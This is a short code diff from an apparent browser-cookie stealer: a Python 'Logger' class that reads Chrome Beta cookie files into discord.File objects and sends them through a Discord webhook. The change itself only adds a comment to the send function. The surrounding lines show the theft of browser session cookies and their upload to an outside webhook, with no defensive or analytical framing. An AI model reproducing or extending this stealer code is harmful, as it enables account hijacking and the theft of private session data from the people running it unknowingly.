@@ -70,7 +70,7 @@ class Logger:
             self.Beta_Cookies_Found = True
             self.Beta_Cookies_File = discord.File(self.Chrome_Beta_User_Data + "/Cookies")
 
-    async def send(self):
+    async def send(self): # I'm aware of how disgusting this function is. 
         webhook = self.webhook
         async with aiohttp.ClientSession() as session:
             w = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
